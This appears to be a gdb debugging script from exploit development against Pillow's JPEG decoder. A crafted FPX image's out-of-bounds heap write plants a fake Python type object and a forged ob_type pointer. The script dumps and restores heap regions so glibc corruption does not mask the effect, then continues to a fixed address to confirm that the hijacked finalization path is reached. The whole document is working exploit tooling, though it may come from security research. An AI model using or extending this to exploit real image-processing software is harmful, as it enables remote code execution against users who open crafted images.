# W7: the fake type is supplied entirely by the crafted FPX image's OOB
# write. gdb does NOT copy PyUnicode_Type nor set tp_dealloc. It only restores
# the pristine heap around the pointer so generic glibc metadata corruption
# does not mask the finalization path, then preserves the image-written
# fake-type bytes and the image-written ob_type pointer. Scratch: /tmp/pw2-w7.
set breakpoint pending on
set pagination off
break ImagingJpegDecode
run
set $b=(unsigned char*)state->buffer
set $f=(unsigned char*)0xd32f90
dump binary memory /tmp/pw2-w7/pre1.bin $b+128 $b+184
dump binary memory /tmp/pw2-w7/pre2.bin $b+192 $b+1024
printf "SAVED type=%lx\n",*(unsigned long*)($b+184)
finish
dump binary memory /tmp/pw2-w7/img_fake.bin $f $f+416
dump binary memory /tmp/pw2-w7/img_ptr.bin $b+184 $b+192
restore /tmp/pw2-w7/pre1.bin binary $b+128
restore /tmp/pw2-w7/pre2.bin binary $b+192
restore /tmp/pw2-w7/img_fake.bin binary $f
restore /tmp/pw2-w7/img_ptr.bin binary $b+184
printf "PTR184=%lx FAKE48=%lx MATCH=%d\n",*(unsigned long*)($b+184),*(unsigned long*)($f+48),*(unsigned long*)($b+184)==$f
break *0x45e6e6
printf "CONTINUE NATURAL (no gdb-set type or slot)\n"
continue
printf "HIT pc=%p\n",$pc
bt 8
info registers rdi
